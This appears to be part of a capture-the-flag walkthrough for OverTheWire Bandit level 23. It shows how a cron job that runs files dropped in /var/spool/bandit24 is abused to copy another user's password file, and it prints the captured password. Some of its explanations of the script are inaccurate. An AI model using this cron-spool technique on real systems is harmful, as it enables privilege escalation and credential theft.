@@ -141,4 +141,73 @@ do
         rm -f ./$i
     fi
 done
+```
+### Note1: Understanding the above script will help us take the next steps to get the next level password.
 
+```
+#!/bin/bash -> alert the system that the current file is a bash script and the following commands are to be executed by The Bourne — Again Shell 
+
+Since the cronjob is run by bandit24 user, the $(whoami) will be bandit24.
+
+cd /var/spool/$myname will navigate to cd /var/spool/bandit24 directory 
+
+echo "Executing and deleting all scripts in /var/spool/$myname:" -> Executes and deletes all scripts in 60 seconds(cronjob)
+
+Consider
+for i in * .*; 
+for i in *  -> iterate all regular files located in the current working directory
+for i in .* -> iterate all hidden files located in the current directory
+Hence, for i in * .* will itereate both regular and hidden files
+
+Inside the for loop, each file undergoes the
+if [ “$i” != “.” -a “$i” != “..” ]; conditional statements to check if 
+the file is a "." hidden file or 
+from ".." previous directory 
+
+If the file is both NOT a hidden file and from previous directory, it will execute the file for 60 seconds before deleting it using rm -f ./$i command.
+
+Since cronjob_bandit24.sh file is run by user bandit24, all these executable shell scripts in /var/spool/bandit24 directory will be executed by user bandit24. 
+
+Therefore, if we create our own script in /var/spool/bandit24 directory, it will be executed as bandit24 and deleted after 60 seconds.
+```
+### Note2: Create a file pass.sh under /tmp/bandit23. Copy it to /var/spool/bandit24 directory so that it will be executed during cronjob. Write a script in the pass.sh file to redirect the password of bandit24 into the file bandit24pass. Make the file pass.sh and the directory bandit23 have read, write and execute permissions.
+```
+
+bandit23@bandit:~$ mkdir /tmp/mybandit23               #create a directory mybandit23 under temp
+bandit23@bandit:~$ chmod 777 /tmp/mybandit23           #provide read, write, execute access for user, group and others for this directory
+bandit23@bandit:~$ cd /tmp/mybandit23                  #navigate to mybandit23
+bandit23@bandit:/tmp/mybandit23$ vim pass.sh           #create a file pass.sh at this path using vim
+                                                       #the above command opens pass.sh file
+                                                       #press i for insert mode in vim
+                                                       #type the below script to redirect the password into bandit24pass file
+                                                       #!/bin/bash
+                                                       #cat /etc/bandit_pass/bandit24 > /tmp/mybandit23/bandit24pass
+                                                       #press Esc to get into command mode
+                                                       #run :wq to save and close the vim
+
+bandit23@bandit:/tmp/mybandit23$ cat pass.sh           #when the vim is closed read the pass.sh file to check for its cotents
+#!/bin/bash                                                         #the entered script is present
+cat /etc/bandit_pass/bandit24 > /tmp/mybandit23/bandit24pass        #the entered script is present
+
+bandit23@bandit:/tmp/mybandit23$ chmod 777 pass.sh                  #provide read, write, execute access for user, group and others for this file
+
+bandit23@bandit:/tmp/mybandit23$ cp pass.sh /var/spool/bandit24/    #copy this file into /var/spool/bandit24/ to be executed by bandit24
+
+bandit23@bandit:/tmp/mybandit23$ ls                                 #see the contents of mybandit23 directory after a minute
+bandit24pass  pass.sh
+
+bandit23@bandit:/tmp/mybandit23$ cat bandit24pass                   #read bandit24pass file to see the password of bandit24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+bandit23@bandit:/tmp/mybandit23$ rm -rf /tmp/mybandit23             #delete the created mybandit23 directory
+
+bandit23@bandit:/tmp/mybandit23$ exit                               #exit from bandit.labs.overthewire.org
+logout
+Connection to bandit.labs.overthewire.org closed.
+```
+###Command-line help text
+```
+cron       -> Daemon to execute scheduled commands
+crontab    -> Maintain crontab files for individual users
+crontab(5) -> File formats
+```
